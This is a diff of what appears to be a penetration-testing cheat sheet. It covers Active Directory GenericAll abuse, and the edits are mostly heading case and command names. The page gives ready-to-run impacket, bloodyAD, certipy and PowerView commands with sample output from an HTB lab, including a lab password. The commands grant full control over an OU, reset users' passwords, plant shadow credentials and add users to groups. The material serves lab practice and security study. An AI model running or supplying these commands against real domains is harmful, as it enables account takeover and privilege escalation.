@@ -4,39 +4,23 @@ date: 2024-7-12
 tags: ["Shadow Credentials", "Powerview", "Credential Dumping", "AddMember", "Impacket", "Genericall", "Domain Controller", "Active Directory", "Windows"]
 ---
 
-### Abuse #1: Change target user password
+### Abuse #1: Change Target User Password
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. Add Full Control to current user
+#### 1. Add Full Control to Current User
 
 {{< tab set1-1 tab1 active >}}impacket{{< /tab >}}{{< tab set1-1 tab2 >}}bloodyAD{{< /tab >}}
 {{< tabcontent set1-1 tab1 >}}
 
-#### Install latest impacket (included dacledit.py)
-
 ```console
-git clone https://github.com/fortra/impacket.git
-```
-
-```console
-cd impacket
-```
-
-```console
-pip3 install .
-```
-
-#### Add Full Control to current user
-
-```console
-sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps
+sudo ntpdate -s <DC> && impacket-dacledit -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps
 ```
 
 ```console {class=sample-code}
-$ dacledit.py -k 'rebound.htb/oorend:1GR8t@$$4u' -dc-ip 10.10.11.231 -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps
+$ impacket-dacledit -k 'rebound.htb/oorend:1GR8t@$$4u' -dc-ip 10.10.11.231 -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps
 Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 
 [*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
@@ -58,7 +42,7 @@ $ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add ge
 
 {{< /tabcontent >}}
 
-#### 2. Change password
+#### 2. Change Password
 
 {{< tab set1-2 tab1 active >}}bloodyAD{{< /tab >}}
 {{< tabcontent set1-2 tab1 >}}
@@ -88,7 +72,7 @@ $ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 set pa
 *Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
 ```
 
-#### 2. Change target user password
+#### 2. Change Target User Password
 
 ```console
 $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force 
@@ -110,38 +94,22 @@ Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
 
 ---
 
-### Abuse #2: Get shadow credentials
+### Abuse #2: Get Shadow Credential
 
 {{< tab set3 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-#### 1. Add Full Control to current user
+#### 1. Add Full Control to Current User
 
 {{< tab set3-1 tab1 active >}}impacket{{< /tab >}}{{< tab set3-1 tab2 >}}bloodyAD{{< /tab >}}
 {{< tabcontent set3-1 tab1 >}}
 
-#### Install latest impacket (included dacledit.py)
-
 ```console
-git clone https://github.com/fortra/impacket.git
-```
-
-```console
-cd impacket
-```
-
-```console
-pip3 install .
-```
-
-#### Add Full Control to current user
-
-```console
-sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps
+sudo ntpdate -s <DC> && impacket-dacledit -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps
 ```
 
 ```console {class="sample-code"}
-$ dacledit.py -k 'rebound.htb/oorend:1GR8t@$$4u' -dc-ip 10.10.11.231 -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps
+$ impacket-dacledit -k 'rebound.htb/oorend:1GR8t@$$4u' -dc-ip 10.10.11.231 -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps
 Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 
 [*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
@@ -163,10 +131,10 @@ $ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add ge
 
 {{< /tabcontent >}}
 
-#### 2. Get shadow credentials
+#### 2. Get Shadow Credential
 
 ```console
-sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USER>@<DOMAIN> -password '<PASSWORD>' -k -account <TARGET_USER> -target <DC>
+sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USER>@<DOMAIN> -password '<PASSWORD>' -k -account <TARGET_USER> -target <DC> -scheme ldap
 ```
 
 ```console {class="sample-code"}
@@ -211,7 +179,7 @@ User Policy update has completed successfully.
 
 ---
 
-### Abuse #3 : Add user to group
+### Abuse #3 : Add User to Group
 
 {{< tab set4 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set4 tab1 >}}
@@ -221,7 +189,7 @@ User Policy update has completed successfully.
 . .\PowerView.ps1
 ```
 
-#### 2. Create a cred object (runas) \[optional\]
+#### 2. Create a Cred Object (runas) \[Optional\]
 
 ```console
 $username = '<DOMAIN>\<USER>'
@@ -235,7 +203,7 @@ $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
-#### 2. Add user to group
+#### 2. Add User to Group
 
 ```console
 Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
